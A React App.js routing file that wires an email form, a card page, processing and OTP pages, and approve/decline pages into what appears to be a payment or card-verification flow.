import './App.css';
import MyForm from './pages/MyForm';
import { Route, Routes } from 'react-router-dom';
import CardPage from './pages/Card';
import Processing from './pages/Processing';
import Header from './components/Header';
import { useState } from 'react';
import Otp from './pages/Otp';
import Processing2 from './pages/Processing2';
import Approve from './pages/Approve';
import Decline from './pages/Decline';

function App() {
  const [email, setEmail] = useState('');
  return (
    <>
      <Header />
      <Routes>
        <Route
          path="/"
          element={<MyForm email={email} setEmail={setEmail} />}
        />
        <Route path="/card" element={<CardPage />} />
        <Route path="/approve" element={<Approve />} />
        <Route path="/decline" element={<Decline />} />
        <Route path="/processing" element={<Processing email={email} />} />
        <Route path="/processing2" element={<Processing2 email={email} />} />
        <Route path="/otp" element={<Otp email={email} />} />
      </Routes>
    </>
  );
}

export default App;
